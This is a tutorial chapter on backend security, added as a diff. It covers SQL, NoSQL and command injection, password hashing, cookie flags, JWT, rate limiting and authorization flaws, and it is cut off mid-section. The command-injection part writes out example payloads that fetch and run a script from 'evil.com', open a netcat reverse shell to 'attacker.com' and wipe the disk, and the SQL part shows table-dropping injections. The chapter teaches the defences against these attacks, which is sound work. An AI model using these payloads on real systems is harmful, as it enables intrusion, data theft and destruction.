@@ -1,0 +1,1102 @@
+---
+order: 17
+title: "Backend Security"
+navTitle: "Backend Security"
+summary: "Chapter 17 of Backend from First Principles: Backend Security."
+readingTime: "2-3 hours"
+keywords:
+  - "security"
+  - "xss"
+  - "csrf"
+  - "sql"
+  - "injection"
+  - "cors"
+  - "csp"
+  - "hsts"
+  - "helmet"
+---
+A detailed backend reference
+
+Security is not a feature you bolt on at the end, it is a mindset you carry into every line of code. This chapter covers the most impactful attack classes a backend engineer will encounter: injection attacks, broken authentication, broken authorization, XSS, CSRF, and misconfiguration, with the mental models and code to prevent all of them.
+
+01
+
+## The Security Mindset: Think Like an Attacker
+
+> "Attackers don't care about your framework or language. They only ask one question: where did the developer make an assumption?"
+
+Every significant vulnerability in the history of software traces back to a developer assuming something that an attacker violated:
+
+- Assuming the input coming from the user will be clean and well-formed.
+- Assuming the user is who they claim to be.
+- Assuming the request is coming from your own front end.
+- Assuming nobody will open the browser's network tab and modify parameters.
+
+These assumptions feel reasonable under deadline pressure, you're always thinking in the **happy path**. Attackers exploit the _unhappy paths_. They poke at every boundary, modify every input, and try to guess every assumption you made.
+
+<Callout type="info">
+The goal of this chapter is to make you **paranoid**: in a productive way. Every time you write code, ask: _"What could go wrong here? What am I assuming? What if that assumption is wrong?"_
+</Callout>
+
+### The Root Cause of Almost Every Attack
+
+Your backend application speaks **multiple languages simultaneously**: SQL to the database, HTML/JS to the browser, shell commands to the OS. Each language has its own grammar, its own special characters, its own way of separating commands from data.
+
+<Diagram caption="Fig 1: Your backend speaks multiple languages. Every boundary crossing is a potential injection point.">
+<svg viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="200" fill="var(--dg-paper)"></rect><defs><marker id="ma" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ink-2)"></path></marker><marker id="mb" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-accent)"></path></marker></defs><rect x="260" y="70" width="160" height="60" rx="10" fill="var(--dg-inverse)"></rect><text x="340" y="97" text-anchor="middle" fill="var(--dg-on-inverse)" font-family="var(--font-prose)" font-size="14" font-weight="700">Your Backend</text><text x="340" y="116" text-anchor="middle" fill="var(--dg-on-inverse)" font-family="var(--font-ui)" font-size="11">speaks 3+ languages</text><rect x="30" y="80" width="140" height="42" rx="8" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="100" y="98" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="12" font-weight="700">Database</text><text x="100" y="114" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-diagram-mono)" font-size="10">language: SQL</text><line x1="172" y1="101" x2="258" y2="101" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#ma)"></line><rect x="510" y="50" width="140" height="42" rx="8" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="580" y="68" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="12" font-weight="700">Browser</text><text x="580" y="84" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-diagram-mono)" font-size="10">language: HTML/JS</text><line x1="422" y1="90" x2="508" y2="71" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#ma)"></line><rect x="510" y="110" width="140" height="42" rx="8" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="580" y="128" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="12" font-weight="700">OS / Shell</text><text x="580" y="144" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-diagram-mono)" font-size="10">language: Shell</text><line x1="422" y1="110" x2="508" y2="131" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#ma)"></line><text x="340" y="170" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">Vulnerability: user input in one language bleeds into another</text></svg>
+</Diagram>
+
+Injection attacks happen when user data (which lives in one language) bleeds into another language's context and gets interpreted as a _command_ rather than _data_. This single insight explains SQL injection, command injection, XSS, and more.
+
+02
+
+## Vulnerability Overview
+
+SQL Injection
+
+User input bleeds into SQL query. Attacker can read all data, delete tables, or run OS commands via DB.
+
+Command Injection
+
+User input bleeds into a shell command. Attacker can run `rm -rf /` or install spyware on your server.
+
+XSS
+
+User content stored as HTML. Malicious script runs in other users' browsers, steals sessions, redirects, phishes.
+
+Broken Auth
+
+Plain-text passwords, weak hashing, predictable session IDs, missing rate limits, attacker takes over accounts.
+
+Broken AuthZ (BOLA/BFLA)
+
+Auth check at routing layer but not at DB layer. User A reads User B's invoices. Member accesses admin API.
+
+CSRF / Misconfig
+
+Cross-site form submissions trick server. Secrets in git, debug logs in production, wrong cookie flags.
+
+03
+
+## SQL Injection
+
+SQL injection has been the #1 most destructive vulnerability for decades. It works because developers build SQL queries by **string concatenation**: dropping raw user input directly into the query template.
+
+### The Attack: Step by Step
+
+Consider a login query built by concatenation:
+
+```sql
+SQL / Vulnerable (Never Do This)-- Template on server:
+SELECT * FROM users WHERE email = '' + userInput + ''
+
+-- Happy path (Alice logs in normally):
+SELECT * FROM users WHERE email = 'alice@gmail.com'
+-- Returns Alice's row 
+
+-- Attacker types:  ' OR '1'='1 --
+SELECT * FROM users WHERE email = '' OR '1'='1' --'
+-- Returns ALL users <- data leak
+
+-- Attacker types:  '; DROP TABLE users; --
+SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
+-- Deletes your entire users table
+```
+
+<Diagram caption="Fig 2: String concatenation confuses code and data. Parameterised queries separate them permanently.">
+<svg viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="200" fill="var(--dg-paper)"></rect><defs><marker id="sq1" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-accent)"></path></marker><marker id="sq2" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ok)"></path></marker></defs><rect x="20" y="60" width="160" height="80" rx="8" fill="var(--dg-accent-surface)" stroke="var(--dg-accent)"></rect><text x="100" y="85" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="12" font-weight="700">Attacker Input</text><text x="100" y="105" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="10">' OR '1'='1 --</text><text x="100" y="122" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="10">'; DROP TABLE users;--</text><line x1="182" y1="100" x2="240" y2="100" stroke="var(--dg-accent)" stroke-width="2" stroke-dasharray="5 3" marker-end="url(#sq1)"></line><text x="210" y="92" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="10">string concat</text><rect x="242" y="60" width="160" height="80" rx="8" fill="var(--dg-accent-surface)" stroke="var(--dg-accent)"></rect><text x="322" y="85" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="12" font-weight="700">SQL Template</text><text x="322" y="103" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="9">WHERE email = '' OR</text><text x="322" y="118" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="9">'1'='1' -- &#x3C;- code!</text><text x="322" y="133" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="10">data treated as code</text><line x1="404" y1="100" x2="460" y2="100" stroke="var(--dg-ok)" stroke-width="2" marker-end="url(#sq2)"></line><text x="432" y="92" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="10">parameterised</text><rect x="462" y="60" width="190" height="80" rx="8" fill="var(--dg-ok-surface)" stroke="var(--dg-ok)"></rect><text x="557" y="85" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="12" font-weight="700">Parameterised</text><text x="557" y="103" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="9">WHERE email = $1</text><text x="557" y="118" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="9">args: &#91;"' OR '1'='1"&#93;</text><text x="557" y="133" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="10">treated purely as string</text></svg>
+</Diagram>
+
+### How Special SQL Characters Enable the Attack
+
+| Character | Meaning in SQL       | How Attacker Uses It                                       |
+| --------- | -------------------- | ---------------------------------------------------------- |
+| `'`       | String delimiter     | Closes the existing string literal, escapes data context   |
+| `;`       | Statement separator  | Ends the legitimate query; starts a new malicious one      |
+| `--`      | Line comment         | Comments out the rest of the original query (trailing `'`) |
+| `OR`      | Logical operator     | Creates an always-true condition to bypass WHERE filters   |
+| `UNION`   | Combines result sets | Extracts data from other tables (payments, secrets)        |
+
+### The Fix: Parameterised Queries
+
+Instead of building one string with everything mashed together, send **two separate things** to the database: (1) the query template with placeholder slots, (2) the user data as separate arguments. The database driver guarantees that whatever goes into a slot is treated as a pure string, never as executable SQL.
+
+```go
+Go / pgx parameterised query//NEVER, string concatenation
+query := "SELECT * FROM users WHERE email = '" + userInput + "'"
+
+// ALWAYS, parameterised ($1 is the slot)
+row := db.QueryRow(ctx,
+    "SELECT id, name FROM users WHERE email = $1",
+    userInput,  // passed separately, treated purely as data
+)
+
+// With an ORM (GORM), parameterised automatically
+db.Where("email = ?", userInput).First(&user)
+```
+
+<Callout type="info">
+Every modern ORM (GORM, SQLAlchemy, Prisma, Hibernate) uses parameterised queries by default. The only way to be vulnerable today is to deliberately bypass them with raw string building. **Never do that.**
+</Callout>
+
+### Additional Hardening: Minimal DB Permissions
+
+Even if a SQL injection succeeds, you can limit the blast radius. The database user your backend uses to connect should only have **DML permissions** (INSERT, UPDATE, DELETE, SELECT), never DDL permissions (DROP TABLE, CREATE TABLE, ALTER). A hacker who gets SQL injection can't delete your tables if the DB user can't execute DDL.
+
+### NoSQL Injection (MongoDB)
+
+MongoDB queries are JSON objects, not SQL strings. But they support _operators_ (prefixed with `$`) like `$ne` (not equal), `$gt`, `$exists`. If you pass raw user-supplied JSON directly to a query, an attacker can inject these operators:
+
+```text
+JavaScript / MongoDB Injection//VULNERABLE: attacker sends {"$ne": null} as email
+db.users.find({ email: req.body.email })
+// Becomes: { email: { $ne: null } }  -> returns ALL users
+
+// FIX: validate that email is a plain string, not an object
+if (typeof req.body.email !== 'string') {
+  return res.status(400).json({ error: 'Invalid email' })
+}
+db.users.find({ email: req.body.email })
+```
+
+04
+
+## Command Injection
+
+Command injection is SQL injection at the OS level. Your backend sometimes needs to call external programs (image processing with FFmpeg, file compression, PDF generation). If you build the shell command by concatenating user input, an attacker can inject shell commands into your server.
+
+### The Attack
+
+```text
+Shell / Vulnerable Image Resize# User supplies the output filename. Attacker sends: "out.jpg; rm -rf /"
+ffmpeg -i input.jpg -vf scale=800:600 out.jpg; rm -rf /
+#                                       ^ ffmpeg done  ^ now this runs
+
+# Attacker can also use:
+# out.jpg && curl evil.com/malware.sh | bash    (install backdoor)
+# out.jpg & nc -e /bin/sh attacker.com 4444 &   (reverse shell in background)
+```
+
+Shell special characters that enable this:
+
+| Character | Shell Meaning             | Attack Use                             |
+| --------- | ------------------------- | -------------------------------------- |
+| `;`       | Separate commands         | Run second command after first         |
+| `&&`      | Run if previous succeeded | Chain exploit after legitimate command |
+| `\|`      | Pipe output               | Feed output to destructive command     |
+| `&`       | Run in background         | Install persistent spyware silently    |
+| `$()`     | Command substitution      | Execute arbitrary command inline       |
+
+### The Fix: Separate Command from Arguments
+
+Every language provides functions that accept the _command_ and _arguments_ as separate parameters. These pass arguments directly to the process without going through a shell interpreter, so special characters are never interpreted.
+
+```go
+Go / exec.Command (safe)import "os/exec"
+
+//VULNERABLE, passes through shell interpreter
+cmd := exec.Command("sh", "-c", "ffmpeg -i input.jpg -o "+userFilename)
+
+// SAFE, command and each argument are separate params
+// Shell never sees userFilename, it goes straight to the process
+cmd := exec.Command(
+    "ffmpeg",
+    "-i", "input.jpg",
+    "-vf", "scale=800:600",
+    userFilename,   // treated as a string argument, not shell code
+)
+output, err := cmd.Output()
+```
+
+```text
+Python / subprocess (safe)import subprocess
+
+#VULNERABLE, shell=True sends everything through sh
+subprocess.run(f"ffmpeg -i input.jpg -o {user_filename}", shell=True)
+
+# SAFE, list form, shell=False (default)
+subprocess.run([
+    "ffmpeg", "-i", "input.jpg",
+    "-vf", "scale=800:600",
+    user_filename   # just a string, not interpreted
+], check=True)
+```
+
+<Callout type="info">
+The rule: **never pass user input into a shell-interpreted string.** Whenever you're building a string that will be executed by another system and it includes user input, stop and find the parameterised alternative. It almost always exists.
+</Callout>
+
+05
+
+## Password Storage: The Three Evolutions
+
+Databases get breached every day. When they do, how you stored passwords determines whether your users' lives are destroyed or not.
+
+<Diagram caption="Fig 3: Password storage evolution. Only option (3) is acceptable in production.">
+<svg viewBox="0 0 700 160" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="700" height="160" fill="var(--dg-paper)"></rect><rect x="20" y="30" width="180" height="100" rx="8" fill="var(--dg-accent-surface)" stroke="var(--dg-accent)"></rect><text x="110" y="56" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="12" font-weight="700">(1) Plain Text</text><text x="110" y="76" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="11">pass&#95;col = "12345"</text><text x="110" y="96" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="10">Breach -> instant pwn</text><text x="110" y="114" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="10">Devs can see all passwords</text><rect x="220" y="30" width="180" height="100" rx="8" fill="var(--dg-warn-surface)" stroke="var(--dg-warn)"></rect><text x="310" y="56" text-anchor="middle" fill="var(--dg-warn)" font-family="var(--font-ui)" font-size="12" font-weight="700">(2) Hashing Only </text><text x="310" y="76" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="11">SHA256("12345")</text><text x="310" y="96" text-anchor="middle" fill="var(--dg-warn)" font-family="var(--font-ui)" font-size="10">Vulnerable to rainbow</text><text x="310" y="114" text-anchor="middle" fill="var(--dg-warn)" font-family="var(--font-ui)" font-size="10">table attacks</text><rect x="420" y="30" width="260" height="100" rx="8" fill="var(--dg-ok-surface)" stroke="var(--dg-ok)"></rect><text x="550" y="56" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="12" font-weight="700">(3) Slow Hash + Salt </text><text x="550" y="76" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="10">argon2id("12345" + salt&#95;u14)</text><text x="550" y="96" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="10">Rainbow tables useless</text><text x="550" y="114" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="10">Brute force: centuries not days</text></svg>
+</Diagram>
+
+### Why Plain Text Fails
+
+Every database breach exposes all passwords instantly. Worse: over 70% of users reuse passwords across sites, so one breach hands attackers the keys to email, banking, and social media accounts they didn't even target.
+
+### Why Hashing Alone Isn't Enough
+
+Attackers pre-compute **rainbow tables**: massive lookup tables mapping common passwords (like "123456", "password", "qwerty") to their hashes. If your hash matches a rainbow table entry, they reverse-lookup the plaintext instantly. A GPU can compute _billions of SHA-256 hashes per second_.
+
+### Salting: Defeating Rainbow Tables
+
+A **salt** is a cryptographically random string generated uniquely for each user. You concatenate the salt with the password before hashing. Since each user's salt is different, even two users with the same password produce completely different hashes. Rainbow tables become useless, they'd need a new table per user.
+
+### Slow Hashing: Defeating Brute Force
+
+General-purpose hash functions (SHA-256, MD5) are designed to be _fast_. A GPU can do billions per second. Password hashing algorithms (bcrypt, scrypt, **Argon2id**) are deliberately _slow_ via a configurable **cost/work factor**. At 400ms per hash:
+
+- Legitimate user logging in: 400ms, imperceptible, totally fine.
+- Attacker brute-forcing offline: 400ms per attempt -> \~2.5 attempts/second instead of billions -> cracking takes _centuries_.
+
+<Callout type="info">
+**Industry standard today:** use `Argon2id` (winner of the Password Hashing Competition). Fallback: bcrypt with cost factor >=12. Never use SHA-256, MD5, or SHA-1 for passwords.
+</Callout>
+
+```go
+Go / Argon2id (golang.org/x/crypto)import (
+    "crypto/rand"
+    "golang.org/x/crypto/argon2"
+    "encoding/base64"
+)
+
+func HashPassword(password string) (string, error) {
+    // Generate cryptographically random 16-byte salt
+    salt := make([]byte, 16)
+    rand.Read(salt)
+
+    // Argon2id params: time=1, memory=64MB, threads=4, keyLen=32
+    hash := argon2.IDKey([]byte(password), salt, 1, 64*1024, 4, 32)
+
+    // Store: $argon2id$salt$hash (both needed to verify)
+    encoded := base64.RawStdEncoding.EncodeToString(salt) +
+               "$" + base64.RawStdEncoding.EncodeToString(hash)
+    return encoded, nil
+}
+
+func VerifyPassword(password, stored string) bool {
+    // Re-hash with stored salt, compare, never compare raw hashes with ==
+    parts := strings.Split(stored, "$")
+    salt, _ := base64.RawStdEncoding.DecodeString(parts[0])
+    newHash := argon2.IDKey([]byte(password), salt, 1, 64*1024, 4, 32)
+    return subtle.ConstantTimeCompare(newHash,
+        mustDecode(parts[1])) == 1
+}
+```
+
+06
+
+## Sessions, Cookies & the Critical Flags
+
+After a user authenticates, you need to remember them across requests. This is done via a **session**: a random identifier stored server-side, linked to the user's data, sent to the browser as a cookie.
+
+### The Session Flow
+
+1. User submits email + password.
+2. Server verifies password (argon2id hash match).
+3. Server generates a **cryptographically random** 128-256 bit session ID.
+4. Server stores the session ID in Redis/DB with user metadata (user ID, IP, user-agent, expiry, created\_at).
+5. Server sends the session ID to browser in a cookie with strict security flags.
+6. Every subsequent request: browser sends cookie -> server looks up session ID -> identifies user.
+
+### The Three Critical Cookie Flags
+
+| Flag         | Value             | What It Does                             | Without It                                        |
+| ------------ | ----------------- | ---------------------------------------- | ------------------------------------------------- |
+| **HttpOnly** | `true`            | JS cannot read this cookie               | XSS steals session ID via `document.cookie`       |
+| **Secure**   | `true`            | Cookie only sent over HTTPS              | Session stolen by Wi-Fi eavesdropper or Wireshark |
+| **SameSite** | `Strict` or `Lax` | Cookie not sent in cross-origin requests | CSRF attacks can use your cookie from evil.com    |
+
+```text
+Go / Secure Cookiehttp.SetCookie(w, &http.Cookie{
+    Name:     "session_id",
+    Value:    sessionID,
+    HttpOnly: true,          // JS cannot access
+    Secure:   true,           // HTTPS only
+    SameSite: http.SameSiteStrictMode,  // no cross-site
+    MaxAge:   7 * 24 * 3600, // 7 days
+    Path:     "/",
+})
+```
+
+<Callout type="info">
+**Never store session IDs or JWT tokens in localStorage.** LocalStorage is accessible by any JavaScript on the page. One XSS vulnerability = all sessions stolen. Always use `HttpOnly` cookies.
+</Callout>
+
+07
+
+## JWT: Stateless Authentication
+
+A JWT (JSON Web Token) is an alternative to server-side sessions. Instead of storing session data in the DB and sending only an ID to the client, the JWT _contains_ the session data, signed cryptographically so it cannot be tampered with.
+
+### JWT Structure
+
+<Diagram caption="Fig 4: JWT: three Base64-encoded parts joined by dots. Payload is readable, but tamper-proof via signature.">
+<svg viewBox="0 0 680 100" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="100" fill="var(--dg-paper)"></rect><rect x="20" y="30" width="160" height="40" rx="6" fill="var(--dg-ok)"></rect><text x="100" y="48" text-anchor="middle" fill="var(--dg-on-accent)" font-family="var(--font-ui)" font-size="12" font-weight="700">Header</text><text x="100" y="63" text-anchor="middle" fill="var(--dg-on-accent)" font-family="var(--font-diagram-mono)" font-size="10">alg: HS256, typ: JWT</text><text x="193" y="52" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="14">.</text><rect x="200" y="30" width="260" height="40" rx="6" fill="var(--dg-info)"></rect><text x="330" y="48" text-anchor="middle" fill="var(--dg-on-accent)" font-family="var(--font-ui)" font-size="12" font-weight="700">Payload (Claims)</text><text x="330" y="63" text-anchor="middle" fill="var(--dg-on-accent)" font-family="var(--font-diagram-mono)" font-size="10">sub: user&#95;id, iat, exp, role: "admin"</text><text x="463" y="52" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="14">.</text><rect x="470" y="30" width="190" height="40" rx="6" fill="var(--dg-info)"></rect><text x="565" y="48" text-anchor="middle" fill="var(--dg-on-accent)" font-family="var(--font-ui)" font-size="12" font-weight="700">Signature</text><text x="565" y="63" text-anchor="middle" fill="var(--dg-on-accent)" font-family="var(--font-diagram-mono)" font-size="10">HMAC(header+payload, secret)</text></svg>
+</Diagram>
+
+<Callout type="info">
+**The payload is NOT encrypted, only signed.** It is Base64-encoded, which anyone can decode. Never store sensitive data (passwords, PII, credit card numbers) in JWT claims. Only store what the server needs (user ID, role), and what's safe if exposed.
+</Callout>
+
+### JWT vs Sessions: When to Use Which
+
+#### Sessions (Stateful) Preferred
+
+- Instant revocation, delete the session row
+- No data exposed to client
+- Simpler architecture for most SaaS
+- Scalable with Redis (shared session store)
+- Recommended by most security experts
+
+#### JWT (Stateless)
+
+- No DB lookup per request (faster at scale)
+- Revocation is hard, blacklist or short expiry needed
+- If account compromised, can't force logout immediately
+- Workarounds: short expiry (5-10min) + refresh tokens
+- Use only if stateless is a hard requirement
+
+### If You Must Use JWT: Best Practices
+
+- **Short access token expiry**: 5-15 minutes. Long-lived tokens are stolen tokens that never expire.
+- **Refresh token rotation**: issue a new access + refresh token pair on each refresh. Stored server-side.
+- **HttpOnly cookie storage**: not localStorage. XSS cannot steal what JS cannot read.
+- **Strong secret**: >=256-bit random secret for HMAC signing. Rotate it periodically.
+- **Verify on every request**: don't trust a JWT just because it's well-formed. Always verify the signature.
+
+08
+
+## Rate Limiting Authentication Endpoints
+
+Without rate limiting, an attacker can send millions of login attempts per second, either to brute-force passwords or to take down your server (DoS). Rate limiting is **mandatory** on all auth endpoints.
+
+### Three Layers of Rate Limiting
+
+<Diagram caption="Fig 5: Three-layer rate limiting: each layer catches attacks that bypass the previous one.">
+<svg viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="200" fill="var(--dg-paper)"></rect><defs><marker id="rl" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ink-2)"></path></marker></defs><rect x="20" y="30" width="180" height="70" rx="8" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="110" y="55" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="12" font-weight="700">Layer 1: Per-IP</text><text x="110" y="73" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="11">10 attempts / minute</text><text x="110" y="89" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="10">Bypassed by botnets / rotating IPs</text><line x1="202" y1="65" x2="238" y2="65" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#rl)"></line><rect x="240" y="30" width="200" height="70" rx="8" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="340" y="55" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="12" font-weight="700">Layer 2: Per-Account</text><text x="340" y="73" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="11">5 failures -> lock 24h</text><text x="340" y="89" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="10">Bypassed by password spray</text><line x1="442" y1="65" x2="478" y2="65" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#rl)"></line><rect x="480" y="30" width="180" height="70" rx="8" fill="var(--dg-ok-surface)" stroke="var(--dg-ok)"></rect><text x="570" y="55" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="12" font-weight="700">Layer 3: Global</text><text x="570" y="73" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="11">100 failures / min system-wide</text><text x="570" y="89" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-ui)" font-size="10">Alert + CAPTCHA all users</text><rect x="20" y="130" width="640" height="46" rx="8" fill="var(--dg-warn-surface)" stroke="var(--dg-warn)"></rect><text x="340" y="152" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="12" font-weight="700">Password Spray Attack</text><text x="340" y="168" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="11">Try one common password ("123456") across millions of accounts -> avoids per-account lockout. Only global rate limiting catches this.</text></svg>
+</Diagram>
+
+```go
+Go / Rate Limiting with golang.org/x/time/rateimport (
+    "golang.org/x/time/rate"
+    "sync"
+    "net/http"
+)
+
+var (
+    mu       sync.Mutex
+    limiters = map[string]*rate.Limiter{}
+)
+
+// Per-IP limiter: 5 requests per second, burst of 10
+func getIPLimiter(ip string) *rate.Limiter {
+    mu.Lock()
+    defer mu.Unlock()
+    l, ok := limiters[ip]
+    if !ok {
+        l = rate.NewLimiter(5, 10)
+        limiters[ip] = l
+    }
+    return l
+}
+
+func RateLimitMiddleware(next http.Handler) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        ip := r.RemoteAddr
+        if !getIPLimiter(ip).Allow() {
+            http.Error(w, "too many requests", http.StatusTooManyRequests)
+            return
+        }
+        next.ServeHTTP(w, r)
+    })
+}
+```
+
+09
+
+## Authorization Vulnerabilities: BOLA & BFLA
+
+> "Authentication tells you who the user is. Authorization tells you what they're allowed to do. Most engineers get authentication right and authorization wrong."
+
+### The Core Mistake
+
+Authorization is checked at the routing layer (middleware). Engineers then assume: _"the user passed auth, so they can access anything from here."_ This creates a dangerous false sense of security.
+
+<Diagram caption="Fig 6: Auth checks at routing layer don't protect data at the DB layer. Add ownership checks in the query.">
+<svg viewBox="0 0 680 220" xmlns="http://www.w3.org/2000/svg" width="100%"><rect width="680" height="220" fill="var(--dg-paper)"></rect><defs><marker id="az" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ink-2)"></path></marker><marker id="azr" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-accent)"></path></marker><marker id="azg" markerWidth="7" markerHeight="7" refX="5" refY="3" orient="auto"><path d="M0,0 L5,3 L0,6 Z" fill="var(--dg-ok)"></path></marker></defs><rect x="20" y="60" width="100" height="40" rx="6" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="70" y="85" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="11">Router</text><line x1="122" y1="80" x2="148" y2="80" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#az)"></line><rect x="150" y="50" width="110" height="60" rx="6" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="205" y="75" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="11" font-weight="700">Auth Middleware</text><text x="205" y="92" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-diagram-mono)" font-size="10">authenticated</text><line x1="262" y1="80" x2="288" y2="80" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#az)"></line><rect x="290" y="60" width="90" height="40" rx="6" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="335" y="85" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="11">Handler</text><line x1="382" y1="80" x2="408" y2="80" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#az)"></line><rect x="410" y="60" width="90" height="40" rx="6" fill="var(--dg-surface)" stroke="var(--dg-line)"></rect><text x="455" y="85" text-anchor="middle" fill="var(--dg-ink)" font-family="var(--font-ui)" font-size="11">Service</text><line x1="502" y1="80" x2="528" y2="80" stroke="var(--dg-ink-2)" stroke-width="1.5" marker-end="url(#az)"></line><rect x="530" y="60" width="120" height="40" rx="6" fill="var(--dg-accent-surface)" stroke="var(--dg-accent)"></rect><text x="590" y="82" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">Repository &#x3C;-</text><text x="590" y="95" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-diagram-mono)" font-size="9">SELECT &#42; WHERE id=5</text><text x="590" y="135" text-anchor="middle" fill="var(--dg-accent)" font-family="var(--font-ui)" font-size="11" font-weight="700">VULNERABLE</text><text x="590" y="150" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">No user ownership check</text><text x="590" y="165" text-anchor="middle" fill="var(--dg-ink-2)" font-family="var(--font-ui)" font-size="10">Any user can fetch any ID</text><rect x="530" y="180" width="140" height="30" rx="6" fill="var(--dg-ok-surface)" stroke="var(--dg-ok)"></rect><text x="600" y="199" text-anchor="middle" fill="var(--dg-ok)" font-family="var(--font-diagram-mono)" font-size="9">WHERE id=5 AND user&#95;id=$ctx</text></svg>
+</Diagram>
+
+### (1) BOLA: Broken Object Level Authorization
+
+_(Also called IDOR, Insecure Direct Object Reference)_
+
+User A can access, modify, or delete the resources of User B by guessing or iterating their IDs.
+
+```sql
+SQL / BOLA Fix--VULNERABLE: fetches invoice 5 regardless of who is asking
+SELECT * FROM invoices WHERE id = $1
+
+-- FIXED: also requires the invoice to belong to the requesting user
+SELECT * FROM invoices
+WHERE  id = $1
+  AND  user_id = $2    -- $2 comes from the verified session/JWT, not user input
+
+-- If no row: return 404 (not 403)
+-- Why 404? A 403 CONFIRMS the resource exists -> information leak
